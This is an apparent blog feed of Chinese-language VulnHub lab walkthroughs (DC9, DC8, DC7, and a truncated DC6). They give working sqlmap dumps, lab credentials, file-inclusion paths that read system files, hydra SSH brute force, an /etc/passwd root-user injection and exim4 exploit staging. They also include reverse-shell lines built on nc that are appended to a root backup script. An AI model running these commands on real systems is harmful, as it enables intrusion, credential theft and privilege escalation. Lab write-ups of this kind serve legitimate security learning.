<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ke1nys`Blog</title>
  
  <subtitle>q:1478456309</subtitle>
  <link href="https://ke1nys.github.io/atom.xml" rel="self"/>
  
  <link href="https://ke1nys.github.io/"/>
  <updated>2023-04-14T13:00:37.559Z</updated>
  <id>https://ke1nys.github.io/</id>
  
  <author>
    <name>ke1nys</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vulnhub-DC9</title>
    <link href="https://ke1nys.github.io/posts/b398db55.html"/>
    <id>https://ke1nys.github.io/posts/b398db55.html</id>
    <published>2023-04-14T09:29:16.000Z</published>
    <updated>2023-04-14T13:00:37.559Z</updated>
    
    <content type="html"><![CDATA[<p><strong>总结：<a href="https://so.csdn.net/so/search?q=sql注入&amp;spm=1001.2101.3001.7020">sql注入</a>，端口敲门，覆盖passwd提权</strong></p><p>先扫一下c段</p><p><img src="../images/image-20230414173216143.png" alt="image-20230414173216143"></p><p>发现主机，然后进行端口扫描</p><p><img src="../images/image-20230414173411019.png" alt="image-20230414173411019"></p><p>还是着两个常规端口</p><p><img src="../images/image-20230414173519934.png" alt="image-20230414173519934"></p><p>这就是上面state的解释</p><p>简单来说就是不知道22端口是开的还是关的</p><p>于是我们就去尝试一下访问80端口</p><p><img src="../images/image-20230414173658881.png" alt="image-20230414173658881"></p><p>发现一个网站，但是不是一个cms</p><p>于是我们就开始探索网站，看存在哪些可以利用的地方</p><p><img src="../images/image-20230414173849111.png" alt="image-20230414173849111"></p><p><img src="../images/image-20230414173859531.png" alt="image-20230414173859531"></p><p>上面的sql语句会把下面的内容给爆出来，所以就是说这个地方存在sql漏洞，那么我们就可以进行sqlmap查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.10/results.php&quot; --data &quot;search=1&quot; --dbs --batch</span><br><span class="line">sqlmap -u &quot;http://192.168.1.10/results.php&quot; --data &quot;search=1&quot; -D &quot;Staff&quot; --tables --dbs --batch</span><br><span class="line">sqlmap -u &quot;http://192.168.1.10/results.php&quot; --data &quot;search=1&quot; -D &quot;Staff&quot; -T &quot;Users&quot; --columns --dbs --batch</span><br><span class="line">sqlmap -u &quot;http://192.168.142.136/results.php&quot; --data &quot;search=1&quot; -D &quot;Staff&quot; -T &quot;Users&quot; -C &quot;Username&quot;,&quot;Password&quot; --dump --dbs</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414174311321.png" alt="image-20230414174311321"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里我们就得到了admin的密码了</span><br><span class="line"></span><br><span class="line">admin:transorbital1</span><br></pre></td></tr></table></figure><p>然后进行登录</p><p><img src="../images/image-20230414174618993.png" alt="image-20230414174618993"></p><p>成功进行登录</p><p><strong>文件包含</strong></p><p>有个提示：<code>File does not exist</code> 显示文件不存在 通过测试 发现 可能是文件包含漏洞发现这里得用户和刚刚数据库里的用户有些一样的</p><p><img src="../images/image-20230414174903776.png" alt="image-20230414174903776"></p><p>成功读取，说明这里存在文件包含</p><p><img src="../images/image-20230414175012672.png" alt="image-20230414175012672"></p><p>这里知道不少用户的账号， 而且都是/bin/bash,但是说22端口不知道是有没有开启的，然后吧，咱们又不知道干什么了。看看其他人的，这里我们就知道要去查看linux中的任务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//查看linux的任务</span><br><span class="line">http://靶机ip/welcome.php?file=../../../../../../proc/sched_debug</span><br></pre></td></tr></table></figure><p> 这里因为太乱了没有排序，这里教给大家一个好方法，这里直接ctrl+u直接查看源代码，他就会自动给我们排列了。</p><p><img src="../images/image-20230414175829926.png" alt="image-20230414175829926"></p><p>这里发现了这个knockd服务</p><p>然后我们就去查看他的配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://靶机ip/welcome.php?file=../../../../../../etc/knockd.conf</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414175946047.png" alt="image-20230414175946047"></p><p>那么这里就涉及到一个新的知识点了</p><h3 id="端口敲门"><a href="#端口敲门" class="headerlink" title="端口敲门"></a>端口敲门</h3><p>这里分析一下这个配置文件，在按循序访问了这个三个端口，linux防火墙就不会防我们了，iptables就是linux设置防火墙的命令，这里给大家推荐一个博客，看完也就理解端口敲门是用来看什么的了<a href="https://blog.csdn.net/m0_65129142/article/details/121993950">Web端口敲门的奇思妙想</a>    <a href="https://zhuanlan.zhihu.com/p/59488488">端口敲门</a></p><p>所以<strong>敲门密码</strong>我们从哪获取呢，就是通过访问<strong>knock服务的配置文件</strong>，然后从中获取</p><p><img src="../images/image-20230414181653673.png" alt="image-20230414181653673"></p><p>配置文件中给我们提供了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS 靶机ip -p 7469</span><br><span class="line">nmap -sS 靶机ip -p 8475</span><br><span class="line">nmap -sS 靶机ip -p 9842</span><br><span class="line"></span><br><span class="line">//这里有一个工具也是可以的，但是感觉很慢</span><br><span class="line">//没有需要自己下，apt install knockd</span><br><span class="line">knock 靶机ip 7469 8475 9842</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414181856542.png" alt="image-20230414181856542"></p><p>发现ssh端口成功打开</p><p>利用sqlmap查到的全部用户名和密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.136/results.php&quot; --data &quot;search=1&quot; -D users -T UserDetails --dump</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414182229536.png" alt="image-20230414182229536"></p><p>于是进行ssh爆破，利用之前用到的工具，<code>hydra</code></p><p>因为不知道哪些用户能进行ssh登录</p><p>发现了三个用户分别是 <code>joeyt Passw0rd</code> 和<code>janitor Ilovepeepee</code> 和<code>chandlerb UrAG0d</code></p><p><img src="../images/image-20230414183153111.png" alt="image-20230414183153111"></p><p>使用命令：<code>ssh joeyt@192.168.142.136</code> （这里ip自动获取了不用在意一样的）等三个用户都进行登入看看有没有什么隐藏的信息</p><p><img src="../images/image-20230414183205288.png" alt="image-20230414183205288"></p><p><img src="../images/image-20230414183129965.png" alt="image-20230414183129965"></p><p><img src="../images/image-20230414183411763.png" alt="image-20230414183411763"></p><p>发现存在一个密码，那么我们就拿这些密码添加到用来爆破的字典里，看还能不能再爆破出来一些可登录的账号密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt ssh://192.168.142.136</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414183714258.png" alt="image-20230414183714258"></p><p>发现一个新账号  于是进行登录</p><p><img src="../images/image-20230414183837607.png" alt="image-20230414183837607"></p><p>登录成功  </p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>还是老三样  </p><p>suid <code>sudo -l</code>  内核提权</p><p><img src="../images/image-20230414183955956.png" alt="image-20230414183955956"></p><p>访问这个目录进行查看这是什么东西</p><p><img src="../images/image-20230414184127144.png" alt="image-20230414184127144"></p><p>发现这个<code>test</code>是一个<code>python</code>文件</p><p>那么我们就得去找这个<code>test.py</code>文件</p><p>看看他为什么能进行提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用命令：find / -name test.py 2&gt;/dev/null 查找python文件 进行查看</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414200337779.png" alt="image-20230414200337779"></p><p>发现这个test.py文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大概的就是将参数<code>1</code>的内容写到参数<code>2</code>中然后生成一个用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//使用openssl命令</span><br><span class="line">openssl passwd -1 -salt hahaha 123456</span><br><span class="line">生成$1$hahaha$hSxFjZSHRoiEn4DYrrGUI.</span><br><span class="line"> </span><br><span class="line">//因为没有权限先来到tmp</span><br><span class="line">echo &#x27;hahaha:$1$hahaha$hSxFjZSHRoiEn4DYrrGUI.:0:0::/root/:/bin/bash&#x27; &gt;&gt; passwd</span><br><span class="line"> </span><br><span class="line">//这里使用test</span><br><span class="line">sudo /opt/devstuff/dist/test/test passwd /etc/passwd</span><br><span class="line">//这里执行的test.py是 将/tmp下的用户添加到/etc/passwd下</span><br><span class="line"> </span><br><span class="line">//然后替换到hahaha用户，密码123456</span><br><span class="line">su hahaha</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/minioesina/article/details/88145581?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-88145581-blog-54884976.235^v29^pc_relevant_default_base3&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3">openssl命令的解释</a></p><p><img src="../images/image-20230414204810615.png" alt="image-20230414204810615"></p><p><img src="../images/image-20230414205017910.png" alt="image-20230414205017910"></p><p><strong>④：就是/etc/passwd 的格式 这个不了解的话最好一步提权很容易错的</strong><br><strong>格式：用户名：密码：UID（用户ID）：GID（组ID）：描述性信息：主目录：默认Shell</strong><br><strong>（”x” 表示此用户设有密码，但不是真正的密码，真正的密码保存在 /etc/shadow 文件中</strong><br><strong>允许登入的shell就是/bin/bash禁止shell登入就是/sbin/nologin）</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;总结：&lt;a href=&quot;https://so.csdn.net/so/search?q=sql注入&amp;amp;spm=1001.2101.3001.7020&quot;&gt;sql注入&lt;/a&gt;，端口敲门，覆盖passwd提权&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;先扫一下c段&lt;/</summary>
      
    
    
    
    
    <category term="vulnhub DC9" scheme="https://ke1nys.github.io/tags/vulnhub-DC9/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-DC8</title>
    <link href="https://ke1nys.github.io/posts/c49febc3.html"/>
    <id>https://ke1nys.github.io/posts/c49febc3.html</id>
    <published>2023-04-14T06:55:11.000Z</published>
    <updated>2023-04-14T08:12:08.599Z</updated>
    
    <content type="html"><![CDATA[<p><strong>总结：exim4<a href="https://so.csdn.net/so/search?q=提权&amp;spm=1001.2101.3001.7020">提权</a></strong></p><p>先扫一下c段，找一下靶机</p><p><img src="../images/image-20230414150131729.png" alt="image-20230414150131729"></p><p>接下来扫一下端口，看开放了哪些端口</p><p><img src="../images/image-20230414150444248.png" alt="image-20230414150444248"></p><p>发现存在了两个端口  80 和 22</p><p>访问80端口</p><p><img src="../images/image-20230414150611475.png" alt="image-20230414150611475"></p><p>还是老样子，还是这个cms</p><p>这个版本的话很像存在漏洞的样子</p><p><strong>Droopescan是一款基于插件的扫描器，可帮助安全研究人员发现Drupal，SilverStripe，Wordpress，Joomla（枚举版本信息和可利用URL地址）和Moodle的问题。</strong></p><p>学习一下这一款工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/droope/droopescan.git</span><br><span class="line"></span><br><span class="line">cd droopescan</span><br><span class="line"></span><br><span class="line">pip install -r requirements.txt</span><br><span class="line"></span><br><span class="line">./droopescan scan --help</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用工具<code>droopescan</code>扫一下后台（因为也是第一次使用所以也是学习了一下）后台地址： <code>192.168.0.104/user/login</code>我们还是先看下网站有没有漏洞先</p><p><strong>这里也可以使用 使用别的扫描工具进行扫描，效果是一样的</strong></p><p><img src="../images/image-20230414150751373.png" alt="image-20230414150751373"></p><p>发现存在类似sql注入的感觉，拿sqlmap来进行尝试一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.142.135/?nid=1 --dbs #列出数据库</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414151758412.png" alt="image-20230414151758412"></p><p>发现两个数据库</p><p>然后查看表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.142.135?nid=1 -D d7db --tables  #列出数据库的表</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414152033676.png" alt="image-20230414152033676"></p><p>查出一堆表名，接下来就是查列名了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.142.135?nid=1 -D d7db -T users --columns #列出字段</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414152151409.png" alt="image-20230414152151409"></p><p>然后开始进行数据的查看了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.142.135?nid=1 -D d7db -T users -C name,pass -dump #列出账号和密码</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414152515057.png" alt="image-20230414152515057"></p><p>发现是进行密码加密后的</p><p>于是尝试进行破解  (<strong>这里估计只能进行john破解，admin的话，字典里可能没有</strong>)</p><p><img src="../images/image-20230414152838028.png" alt="image-20230414152838028"></p><p>爆出密码，于是尝试进行登录</p><p><img src="../images/image-20230414152925308.png" alt="image-20230414152925308"></p><p>成功登录john用户</p><p>发现<code>Content</code>-&gt;点击<code>edit</code>-&gt;点击<code>WEBFORMS</code>-&gt;点击<code>Form settings</code>-&gt;点击下拉框选择<code>PHP code</code></p><p>这里可以写文件进行上传</p><p><img src="../images/image-20230414153441690.png" alt="image-20230414153441690"></p><p>发现shell反弹成功</p><p><strong>(这里能反弹成功是因为在提交contact us成功后会弹出一个一个html页面内容，然后我们在里面修改为phpcode，并且内容添加了shell，所以就能反弹成功)</strong></p><p>python shell交互</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>接下来就是提权了</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>还是利用这几个方法  suid sudo 内核提权</p><p><strong>sudo -l 找不到东西</strong></p><p>尝试一下suid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414154016149.png" alt="image-20230414154016149"></p><p>发现一个新东西，于是就看下他可不可以进行提权</p><p>找到一个exim4命令，exim是一款在<strong>Unix系统上使用的邮件服务</strong>，exim4在使用时具有root权限</p><p>于是就去<code>searchsploit</code>查找一下看他有没有漏洞</p><p><img src="../images/image-20230414154330691.png" alt="image-20230414154330691"></p><p>发现存在本地提权漏洞</p><p>但是不知道是哪个版本，于是就去所属目录进行查看</p><p><img src="../images/image-20230414154735143.png" alt="image-20230414154735143"></p><p>发现版本，于是就去读取<code>searchsplot</code>给的文件内容</p><p><img src="../images/image-20230414155000270.png" alt="image-20230414155000270"></p><p>然后把<code>46996.sh</code>拷贝到本地并改名为<code>666.sh</code>，并在kali开启http服务 <code>service apache2 start</code></p><p>这里开启服务的原因是为了能把本地的提权文件上传到目标服务器上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">我们创建网站，然后这里我们可以使用wget上传，这里有两种方法可以使用</span><br><span class="line"></span><br><span class="line">1.可以使用python创建临时网站</span><br><span class="line"></span><br><span class="line">2.使用Apache之类的</span><br><span class="line"></span><br><span class="line">因为我们这里有apache就不使用python了。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//将exp直接复制到，网站根目录下面</span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/46996.sh /var/www/html/1.sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//这里我们来到/tmp目录下面，因为其他目录通常会没有权限</span><br><span class="line">//然后wget下载,这里要看自己的ip和文件名</span><br><span class="line">wget http://192.168.1.12/1.sh</span><br><span class="line"> </span><br><span class="line">//给权限</span><br><span class="line">chmod 777 1.sh </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414160151191.png" alt="image-20230414160151191"></p><p>上传成功</p><p>然后查看文件，根据文件里的方法进行提权</p><p><img src="../images/image-20230414160501356.png" alt="image-20230414160501356"></p><p>发现上面的不行后，我们换另一种方法</p><p>文件里有好几种方法，可以自己进行查看</p><p><img src="../images/image-20230414160717547.png" alt="image-20230414160717547"></p><p><img src="../images/image-20230414160818299.png" alt="image-20230414160818299"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">然后在5秒后输入</span><br><span class="line"></span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line"></span><br><span class="line">他就会直接跳转到root</span><br><span class="line"></span><br><span class="line">注意这个是有时间限制的</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414160847635.png" alt="image-20230414160847635"></p><p>拿下</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;总结：exim4&lt;a href=&quot;https://so.csdn.net/so/search?q=提权&amp;amp;spm=1001.2101.3001.7020&quot;&gt;提权&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;先扫一下c段，找一下靶机&lt;/p&gt;
&lt;p&gt;&lt;img </summary>
      
    
    
    
    
    <category term="vulnhub DC8" scheme="https://ke1nys.github.io/tags/vulnhub-DC8/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-DC7</title>
    <link href="https://ke1nys.github.io/posts/5420f652.html"/>
    <id>https://ke1nys.github.io/posts/5420f652.html</id>
    <published>2023-04-13T03:13:23.000Z</published>
    <updated>2023-04-13T11:39:18.577Z</updated>
    
    <content type="html"><![CDATA[<p><strong>总结：<a href="https://so.csdn.net/so/search?q=社工&amp;spm=1001.2101.3001.7020">社工</a>尝试</strong></p><p>先扫一下c段，发现一下靶机</p><p><img src="../images/image-20230413111626730.png" alt="image-20230413111626730"></p><p>然后扫一下端口</p><p><img src="../images/image-20230413111722488.png" alt="image-20230413111722488"></p><p>只有两端口是开放的  80    22 </p><p><img src="../images/image-20230413111858833.png" alt="image-20230413111858833"></p><p>熟悉的drupal框架，只不过这个版本比较新，之前存在漏洞的是7</p><p>msf找不到</p><p>然后尝试一下<code>searchsploit</code>工具，发现是找到的漏洞版本都太新，不适合</p><p><img src="../images/image-20230413112735971.png" alt="image-20230413112735971"></p><p>然后扫目录</p><p>sqlmap  尝试后都无果  最后后翻译了一下网站给的话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DC-7引入了一些“新”概念，但我将留给你们去弄清楚它们是什么。：-）</span><br><span class="line">虽然这个挑战并不完全是技术性的，但如果你需要诉诸暴力或字典攻击，你可能不会成功。</span><br><span class="line">你要做的是跳出框框思考。在盒子外面。：-）</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230413113004345.png" alt="image-20230413113004345"></p><p>发现存在也该一个玩意，于是尝试去网上进行搜索发现了一个github地址</p><p><img src="../images/image-20230413113123298.png" alt="image-20230413113123298"></p><p>发现这个github地址</p><p>于是查看配置文件发现</p><p><img src="../images/image-20230413113144350.png" alt="image-20230413113144350"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;dc7user&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;MdR3xOgB7#dW&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;Staff&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>于是可以尝试数据库连接或者ssh连接，看哪个能成功</p><p><img src="../images/image-20230413113616668.png" alt="image-20230413113616668"></p><p>ssh登录成功</p><p><img src="../images/image-20230413113653632.png" alt="image-20230413113653632"></p><p>发现存在加密文件</p><p><strong>ls一下看见了两个文件 一个<code>backups</code> 一个<code>mobx</code>进入<code>backups</code>文件夹，发现两个文件，<code>gpg</code>后缀的！！！第一次见 百度一下看看<br><code>gpg</code>是一种基于密钥的加密方式，使用了一对密钥对消息进行加密和解密，来保证消息的安全传输格式是用来加密文件的。</strong></p><p><img src="../images/image-20230413113924613.png" alt="image-20230413113924613"></p><p><strong>然后再看一下 <code>mbox</code> 文件 <code>cat mbox</code> 发现在<code>/opt/scripts/</code> 有个可以执行的脚本文件 <code>backups.sh</code></strong></p><p><img src="../images/image-20230413114040196.png" alt="image-20230413114040196"></p><p><strong>发现了<code>drush</code> 什么是drush？？？？？？？？？？？？？ 经过百度查阅发现<code>drush</code> 是<code>drupal shell</code> 专门管理<code>drupal</code>站点的<code>shell</code></strong></p><p><strong>进入到<code>/var/www/html</code>目录下，使用<code>drush</code>命令修改admin用户的密码为<code>123456</code>，发现可以修改成功！！！</strong></p><p><img src="../images/image-20230413114909163.png" alt="image-20230413114909163"></p><p>修改成功</p><p>但是登不进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush php-eval &#x27;db_query(&quot;DELETE FROM flood&quot;);&#x27;</span><br></pre></td></tr></table></figure><p>先修改密码  在执行这个语句才能登录进去</p><p><img src="../images/image-20230413115924584.png" alt="image-20230413115924584"></p><p>进入后台后  需要找一下哪能进行漏洞利用</p><p><strong>在Content—&gt;Add content–&gt;Basic page下</strong> </p><p>因为这里可以写文件，然后就可以写木马，然后进行上传，然后我们找到上传地址，然后访问上传文件就可以利用shell了</p><p><img src="../images/image-20230413120811600.png" alt="image-20230413120811600"></p><p>但是这里没有php模板，所以我们就得自己装一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.drupal.org/project/php  # 插件下载地址</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz #模块包</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230413160601781.png" alt="image-20230413160601781"></p><p>上传成功后，进行反弹shell</p><p><img src="../images/image-20230413160705537.png" alt="image-20230413160705537"></p><p>反弹成功，进行交互shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>然后就是尝试进行提权了  </p><p>就是利用之前发现的一个sh文件来进行提权</p><p><img src="../images/image-20230413192501447.png" alt="image-20230413192501447"></p><p>因为文件里的内容是这样的  <code>rm xxxx</code>于是我们就可以考虑一下使用<strong>rm</strong>来进行反弹shell利用这个脚本反弹shell之后就是root权限了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.142.129 7777 &gt;/tmp/f&quot; &gt;&gt; backups.sh</span><br></pre></td></tr></table></figure><p>添加单纯的<strong>nc反弹shell</strong>也行  不用rm也行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;nc -e /bin/bash/ 192.168.202.129 1234&quot; &gt;&gt;backups.sh</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;总结：&lt;a href=&quot;https://so.csdn.net/so/search?q=社工&amp;amp;spm=1001.2101.3001.7020&quot;&gt;社工&lt;/a&gt;尝试&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;先扫一下c段，发现一下靶机&lt;/p&gt;
&lt;p&gt;&lt;img sr</summary>
      
    
    
    
    
    <category term="vulnhub DC7" scheme="https://ke1nys.github.io/tags/vulnhub-DC7/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-DC6</title>
    <link href="https://ke1nys.github.io/posts/2327c6c4.html"/>
    <id>https://ke1nys.github.io/posts/2327c6c4.html</id>
    <published>2023-04-13T02:04:35.000Z</published>
    <updated>2023-04-13T03:07:02.612Z</updated>
    
    <content type="html"><![CDATA[<p><strong>总结:wpscan爆破，<a href="https://so.csdn.net/so/search?q=nmap&amp;spm=1001.2101.3001.7020">nmap</a>提权</strong></p><p>发现靶机ip</p><p><img src="../images/image-20230413100512563.png" alt="image-20230413100512563"></p><p>接下来进行端口扫描</p><p><img src="../images/image-20230413100554636.png" alt="image-20230413100554636"></p><p>还是两个正常端口  22和80</p><p>然后访问80端口</p><p><img src="../images/image-20230413100651538.png" alt="image-20230413100651538"></p><p>访问不了   但出现了一个域名</p><p>猜测是域名解析的问题</p><p>于是就去修改 <code>/etc/hosts</code></p><p><img src="../images/image-20230413101135856.png" alt="image-20230413101135856"></p><p>修改后访问成功，发现是wordpress框架的</p><p><img src="../images/image-20230413101154443.png" alt="image-20230413101154443"></p><p>于是就可以使用<code>wpscan</code>工具进行扫描了  先扫一下网站有哪些用户</p><p><code>wpscan --url -e</code> </p><p><img src="../images/image-20230413101443241.png" alt="image-20230413101443241"></p><p>发现存在好几个用户</p><p>那么我们就尝试扫目录，看能不能扫出后台登录地址来</p><p><img src="../images/image-20230413101610519.png" alt="image-20230413101610519"></p><p>发现存在类似后台的目录</p><p><img src="../images/image-20230413101640997.png" alt="image-20230413101640997"></p><p>成功发现后台</p><p>这里的话是不知道密码的  于是我们就选择进行爆破</p><p>但是如果这里使用的是<strong>cewl</strong>根据这个网站生成的密码的话  然后使用<strong>wpscan</strong>进行爆破的话，是不会成功的</p><p>因为生成的字典里没有那个密码</p><p><strong>(下面这种是不会成功的)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span 